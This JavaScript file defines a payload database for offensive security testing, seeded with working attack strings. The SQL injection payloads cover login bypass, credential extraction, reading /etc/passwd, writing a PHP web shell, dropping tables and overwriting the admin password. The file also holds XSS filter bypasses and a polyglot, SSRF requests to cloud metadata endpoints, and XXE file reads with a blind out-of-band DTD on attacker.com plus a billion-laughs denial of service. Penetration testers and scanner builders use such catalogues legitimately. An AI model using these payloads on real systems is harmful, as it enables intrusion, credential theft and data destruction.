/**
 * Payload Database - Centralized Offensive-Security Payloads
 * Production-grade payload intelligence system
 */

class PayloadDatabase {
  constructor() {
    this.payloads = {};
    this.seeded = false;
  }

  /**
   * Initialize and seed the database with comprehensive payloads
   */
  init() {
    if (this.seeded) return;
    this.seedSQLiPayloads();
    this.seedXSSPayloads();
    this.seedSSRFCPayloads();
    this.seedXXEPayloads();
    this.seeded = true;
  }

  /**
   * SQL Injection Payloads
   */
  seedSQLiPayloads() {
    const sqliPayloads = [
      // Basic Detection
      { id: 'sqli-basic-1', vulnerability: 'sql-injection', category: 'detection', payload: "'", context: { database: 'all', type: 'error-based' }, wafBypass: false },
      { id: 'sqli-basic-2', vulnerability: 'sql-injection', category: 'detection', payload: '"', context: { database: 'all', type: 'error-based' }, wafBypass: false },
      { id: 'sqli-basic-3', vulnerability: 'sql-injection', category: 'detection', payload: "' OR '1'='1", context: { database: 'all', type: 'boolean-based' }, wafBypass: false },
      { id: 'sqli-basic-4', vulnerability: 'sql-injection', category: 'detection', payload: "' OR '1'='1' --", context: { database: 'all', type: 'boolean-based' }, wafBypass: false },
      { id: 'sqli-basic-5', vulnerability: 'sql-injection', category: 'detection', payload: "1' AND '1'='1", context: { database: 'all', type: 'boolean-based' }, wafBypass: false },

      // Authentication Bypass
      { id: 'sqli-auth-1', vulnerability: 'sql-injection', category: 'auth-bypass', payload: "admin' --", context: { database: 'all', type: 'login-bypass' }, wafBypass: false },
      { id: 'sqli-auth-2', vulnerability: 'sql-injection', category: 'auth-bypass', payload: "admin' #", context: { database: 'mysql', type: 'login-bypass' }, wafBypass: false },
      { id: 'sqli-auth-3', vulnerability: 'sql-injection', category: 'auth-bypass', payload: "' OR 1=1--", context: { database: 'all', type: 'login-bypass' }, wafBypass: false },
      { id: 'sqli-auth-4', vulnerability: 'sql-injection', category: 'auth-bypass', payload: "') OR ('1'='1", context: { database: 'all', type: 'login-bypass' }, wafBypass: false },
      { id: 'sqli-auth-5', vulnerability: 'sql-injection', category: 'auth-bypass', payload: "admin' OR 1=1--", context: { database: 'all', type: 'login-bypass' }, wafBypass: false },

      // Union-Based
      { id: 'sqli-union-1', vulnerability: 'sql-injection', category: 'union-based', payload: "' UNION SELECT NULL--", context: { database: 'all', type: 'column-detection' }, wafBypass: false },
      { id: 'sqli-union-2', vulnerability: 'sql-injection', category: 'union-based', payload: "' UNION SELECT 1,2,3--", context: { database: 'all', type: 'data-extraction' }, wafBypass: false },
      { id: 'sqli-union-3', vulnerability: 'sql-injection', category: 'union-based', payload: "' UNION SELECT NULL,NULL,NULL--", context: { database: 'all', type: 'column-detection' }, wafBypass: false },
      { id: 'sqli-union-4', vulnerability: 'sql-injection', category: 'union-based', payload: "' UNION SELECT table_name FROM information_schema.tables--", context: { database: 'mysql', type: 'enumeration' }, wafBypass: false },
      { id: 'sqli-union-5', vulnerability: 'sql-injection', category: 'union-based', payload: "' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--", context: { database: 'mysql', type: 'enumeration' }, wafBypass: false },
      { id: 'sqli-union-6', vulnerability: 'sql-injection', category: 'union-based', payload: "' UNION SELECT username,password FROM users--", context: { database: 'all', type: 'data-extraction' }, wafBypass: false },

      // Time-Based Blind (MySQL)
      { id: 'sqli-time-mysql-1', vulnerability: 'sql-injection', category: 'time-based', payload: "' AND SLEEP(5)--", context: { database: 'mysql', type: 'blind' }, wafBypass: false },
      { id: 'sqli-time-mysql-2', vulnerability: 'sql-injection', category: 'time-based', payload: "1' AND SLEEP(5) AND '1'='1", context: { database: 'mysql', type: 'blind' }, wafBypass: false },
      { id: 'sqli-time-mysql-3', vulnerability: 'sql-injection', category: 'time-based', payload: "' AND BENCHMARK(5000000,SHA1('test'))--", context: { database: 'mysql', type: 'blind' }, wafBypass: false },

      // Time-Based Blind (MSSQL)
      { id: 'sqli-time-mssql-1', vulnerability: 'sql-injection', category: 'time-based', payload: "'; WAITFOR DELAY '00:00:05'--", context: { database: 'mssql', type: 'blind' }, wafBypass: false },
      { id: 'sqli-time-mssql-2', vulnerability: 'sql-injection', category: 'time-based', payload: "1; WAITFOR DELAY '00:00:05'--", context: { database: 'mssql', type: 'blind' }, wafBypass: false },

      // Time-Based Blind (PostgreSQL)
      { id: 'sqli-time-pg-1', vulnerability: 'sql-injection', category: 'time-based', payload: "'; SELECT pg_sleep(5)--", context: { database: 'postgresql', type: 'blind' }, wafBypass: false },
      { id: 'sqli-time-pg-2', vulnerability: 'sql-injection', category: 'time-based', payload: "1' AND pg_sleep(5)--", context: { database: 'postgresql', type: 'blind' }, wafBypass: false },

      // Time-Based Blind (Oracle)
      { id: 'sqli-time-ora-1', vulnerability: 'sql-injection', category: 'time-based', payload: "'; DBMS_LOCK.SLEEP(5)--", context: { database: 'oracle', type: 'blind' }, wafBypass: false },

      // File System (MySQL)
      { id: 'sqli-file-1', vulnerability: 'sql-injection', category: 'file-read', payload: "' UNION SELECT LOAD_FILE('/etc/passwd')--", context: { database: 'mysql', type: 'file-read' }, wafBypass: false },
      { id: 'sqli-file-2', vulnerability: 'sql-injection', category: 'file-read', payload: "' UNION SELECT LOAD_FILE('/var/www/html/config.php')--", context: { database: 'mysql', type: 'file-read' }, wafBypass: false },
      { id: 'sqli-file-3', vulnerability: 'sql-injection', category: 'file-write', payload: "' UNION SELECT '<?php system($_GET[\"cmd\"]); ?>' INTO OUTFILE '/var/www/html/shell.php'--", context: { database: 'mysql', type: 'rce' }, wafBypass: false },

      // Stacked Queries
      { id: 'sqli-stacked-1', vulnerability: 'sql-injection', category: 'stacked', payload: "1; DROP TABLE users--", context: { database: 'all', type: 'destruction' }, wafBypass: false },
      { id: 'sqli-stacked-2', vulnerability: 'sql-injection', category: 'stacked', payload: "1'; UPDATE users SET password='hacked' WHERE username='admin'--", context: { database: 'all', type: 'modification' }, wafBypass: false },

      // WAF Bypass
      { id: 'sqli-waf-1', vulnerability: 'sql-injection', category: 'waf-bypass', payload: "UNI/**/ON SEL/**/ECT", context: { database: 'all', type: 'obfuscation' }, wafBypass: true },
      { id: 'sqli-waf-2', vulnerability: 'sql-injection', category: 'waf-bypass', payload: "UNION/**/SELECT", context: { database: 'all', type: 'obfuscation' }, wafBypass: true },
      { id: 'sqli-waf-3', vulnerability: 'sql-injection', category: 'waf-bypass', payload: "%55NION%20SELECT", context: { database: 'all', type: 'encoding' }, wafBypass: true },
      { id: 'sqli-waf-4', vulnerability: 'sql-injection', category: 'waf-bypass', payload: "/*!UNION*/ /*!SELECT*/", context: { database: 'mysql', type: 'obfuscation' }, wafBypass: true },

      // Second-Order
      { id: 'sqli-second-1', vulnerability: 'sql-injection', category: 'second-order', payload: "admin'; WAITFOR DELAY '00:00:05'--", context: { database: 'mssql', type: 'stored' }, wafBypass: false },

      // Database Enumeration
      { id: 'sqli-enum-1', vulnerability: 'sql-injection', category: 'enumeration', payload: "SELECT @@version", context: { database: 'mysql', type: 'fingerprint' }, wafBypass: false },
      { id: 'sqli-enum-2', vulnerability: 'sql-injection', category: 'enumeration', payload: "SELECT DB_NAME()", context: { database: 'mssql', type: 'fingerprint' }, wafBypass: false },
      { id: 'sqli-enum-3', vulnerability: 'sql-injection', category: 'enumeration', payload: "SELECT version()", context: { database: 'postgresql', type: 'fingerprint' }, wafBypass: false },
    ];

    sqliPayloads.forEach(p => this.addPayload(p));
  }

  /**
   * XSS Payloads
   */
  seedXSSPayloads() {
    const xssPayloads = [
      // Basic
      { id: 'xss-basic-1', vulnerability: 'xss', category: 'basic', payload: "<script>alert(1)</script>", context: { type: 'reflected' }, wafBypass: false },
      { id: 'xss-basic-2', vulnerability: 'xss', category: 'basic', payload: "<img src=x onerror=alert(1)>", context: { type: 'event-based' }, wafBypass: false },
      { id: 'xss-basic-3', vulnerability: 'xss', category: 'basic', payload: "<svg onload=alert(1)>", context: { type: 'svg' }, wafBypass: false },

      // DOM-Based
      { id: 'xss-dom-1', vulnerability: 'xss', category: 'dom', payload: "<img src=\"x\" onerror=\"alert(1)\">", context: { type: 'dom' }, wafBypass: false },
      { id: 'xss-dom-2', vulnerability: 'xss', category: 'dom', payload: "<body onload=alert(1)>", context: { type: 'dom' }, wafBypass: false },

      // Stored
      { id: 'xss-stored-1', vulnerability: 'xss', category: 'stored', payload: "<script>alert(document.cookie)</script>", context: { type: 'stored' }, wafBypass: false },
      { id: 'xss-stored-2', vulnerability: 'xss', category: 'stored', payload: "<iframe src=\"javascript:alert(1)\">", context: { type: 'stored' }, wafBypass: false },

      // Filter Bypass
      { id: 'xss-bypass-1', vulnerability: 'xss', category: 'filter-bypass', payload: "<scr<script>ipt>alert(1)</scr</script>ipt>", context: { type: 'tag-filter' }, wafBypass: true },
      { id: 'xss-bypass-2', vulnerability: 'xss', category: 'filter-bypass', payload: "<sCript>alert(1)</scRipt>", context: { type: 'case-filter' }, wafBypass: true },
      { id: 'xss-bypass-3', vulnerability: 'xss', category: 'filter-bypass', payload: "<img src=x onerror=alert(1)>", context: { type: 'event-filter' }, wafBypass: true },

      // Polyglot
      { id: 'xss-poly-1', vulnerability: 'xss', category: 'polyglot', payload: "javascript:/*--></title></style></textarea></script>x\" onmouseover=alert(1)//>", context: { type: 'polyglot' }, wafBypass: true },
    ];

    xssPayloads.forEach(p => this.addPayload(p));
  }

  /**
   * SSRF Payloads
   */
  seedSSRFCPayloads() {
    const ssrfPayloads = [
      // Basic
      { id: 'ssrf-basic-1', vulnerability: 'ssrf', category: 'basic', payload: "http://localhost/", context: { type: 'internal' }, wafBypass: false },
      { id: 'ssrf-basic-2', vulnerability: 'ssrf', category: 'basic', payload: "http://127.0.0.1/", context: { type: 'internal' }, wafBypass: false },
      { id: 'ssrf-basic-3', vulnerability: 'ssrf', category: 'basic', payload: "http://0.0.0.0/", context: { type: 'internal' }, wafBypass: false },

      // Cloud Metadata
      { id: 'ssrf-cloud-1', vulnerability: 'ssrf', category: 'cloud', payload: "http://169.254.169.254/latest/meta-data/", context: { type: 'aws-metadata' }, wafBypass: false },
      { id: 'ssrf-cloud-2', vulnerability: 'ssrf', category: 'cloud', payload: "http://metadata.google.internal/computeMetadata/v1/", context: { type: 'gcp-metadata' }, wafBypass: false },
      { id: 'ssrf-cloud-3', vulnerability: 'ssrf', category: 'cloud', payload: "http://169.254.169.254/metadata/v1/instanceInfo", context: { type: 'azure-metadata' }, wafBypass: false },

      // Bypass
      { id: 'ssrf-bypass-1', vulnerability: 'ssrf', category: 'bypass', payload: "http://127.1/", context: { type: 'shortform' }, wafBypass: true },
      { id: 'ssrf-bypass-2', vulnerability: 'ssrf', category: 'bypass', payload: "http://[::1]/", context: { type: 'ipv6' }, wafBypass: true },
      { id: 'ssrf-bypass-3', vulnerability: 'ssrf', category: 'bypass', payload: "http://localhost@127.0.0.1", context: { type: 'redirect-bypass' }, wafBypass: true },
    ];

    ssrfPayloads.forEach(p => this.addPayload(p));
  }

  /**
   * XXE Payloads
   */
  seedXXEPayloads() {
    const xxePayloads = [
      // Basic
      { id: 'xxe-basic-1', vulnerability: 'xxe', category: 'basic', payload: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>', context: { type: 'file-read' }, wafBypass: false },
      { id: 'xxe-basic-2', vulnerability: 'xxe', category: 'basic', payload: '<!DOCTYPE foo [<!ENTITY test "TEST">]><foo>&test;</foo>', context: { type: 'detection' }, wafBypass: false },

      // SSRF
      { id: 'xxe-ssrf-1', vulnerability: 'xxe', category: 'ssrf', payload: '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>', context: { type: 'ssrf' }, wafBypass: false },
      { id: 'xxe-ssrf-2', vulnerability: 'xxe', category: 'ssrf', payload: '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://localhost:8080/admin">]><foo>&xxe;</foo>', context: { type: 'ssrf' }, wafBypass: false },

      // Blind
      { id: 'xxe-blind-1', vulnerability: 'xxe', category: 'blind', payload: '<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd"> %xxe;]><foo>&data;</foo>', context: { type: 'blind-oob' }, wafBypass: false },

      // DoS
      { id: 'xxe-dos-1', vulnerability: 'xxe', category: 'dos', payload: '<!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;"><!ENTITY lol3 "&lol2;&lol2;"><!ENTITY lol4 "&lol3;&lol3;"><!ENTITY lol5 "&lol4;&lol4;">]><lolz>&lol5;</lolz>', context: { type: 'billion-laughs' }, wafBypass: false },

      // SVG
      { id: 'xxe-svg-1', vulnerability: 'xxe', category: 'svg', payload: '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" height="200"><image xlink:href="file:///etc/passwd"/></svg>', context: { type: 'file-upload' }, wafBypass: false },

      // Wrapper
      { id: 'xxe-wrapper-1', vulnerability: 'xxe', category: 'wrapper', payload: '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=index.php">]><foo>&xxe;</foo>', context: { type: 'php-wrapper' }, wafBypass: false },
    ];

    xxePayloads.forEach(p => this.addPayload(p));
  }

  /**
   * Add a single payload to the database
   */
  addPayload(payload) {
    const id = payload.id || `${payload.vulnerability}-${Date.now()}-${Math.random().toString(36).substr(2, 9)}`;
    
    this.payloads[id] = {
      id,
      vulnerability: payload.vulnerability,
      category: payload.category,
      payload: payload.payload,
      context: payload.context || {},
      wafBypass: payload.wafBypass || false,
      toolSupport: payload.toolSupport || [],
      impact: payload.impact || '',
      references: payload.references || []
    };

    return id;
  }

  /**
   * Batch add payloads
   */
  addPayloads(payloads) {
    return payloads.map(p => this.addPayload(p));
  }

  /**
   * Query payloads with filters
   */
  query(criteria = {}) {
    this.init();
    let results = Object.values(this.payloads);

    if (criteria.vulnerability) {
      results = results.filter(p => p.vulnerability === criteria.vulnerability);
    }

    if (criteria.category) {
      results = results.filter(p => p.category === criteria.category);
    }

    if (criteria.database) {
      results = results.filter(p => p.context.database === criteria.database);
    }

    if (criteria.wafBypass) {
      results = results.filter(p => p.wafBypass === true);
    }

    if (criteria.limit) {
      results = results.slice(0, criteria.limit);
    }

    return results;
  }

  /**
   * Get all payloads for a vulnerability
   */
  getByVulnerability(vuln) {
    return this.query({ vulnerability: vuln });
  }

  /**
   * Get WAF bypass payloads for a vulnerability
   */
  getWafBypass(vuln) {
    return this.query({ vulnerability: vuln, wafBypass: true });
  }

  /**
   * Get database-specific payloads
   */
  getByDatabase(vuln, db) {
    return this.query({ vulnerability: vuln, database: db });
  }

  /**
   * Get payload statistics
   */
  getStats() {
    this.init();
    const stats = {
      totalPayloads: Object.keys(this.payloads).length,
      byVulnerability: {},
      byCategory: {},
      wafBypassCount: 0
    };

    Object.values(this.payloads).forEach(p => {
      if (!stats.byVulnerability[p.vulnerability]) {
        stats.byVulnerability[p.vulnerability] = 0;
      }
      stats.byVulnerability[p.vulnerability]++;

      if (!stats.byCategory[p.category]) {
        stats.byCategory[p.category] = 0;
      }
      stats.byCategory[p.category]++;

      if (p.wafBypass) stats.wafBypassCount++;
    });

    return stats;
  }

  /**
   * Export as JSON
   */
  toJSON() {
    return {
      payloads: this.payloads,
      stats: this.getStats()
    };
  }
}

// Global instance
const payloadDB = new PayloadDatabase();

// Auto-initialize
if (typeof document !== 'undefined') {
  document.addEventListener('DOMContentLoaded', () => {
    payloadDB.init();
    console.log(`Payload Database initialized with ${payloadDB.getStats().totalPayloads} payloads`);
  });
}

if (typeof module !== 'undefined' && module.exports) {
  module.exports = { PayloadDatabase, payloadDB };
}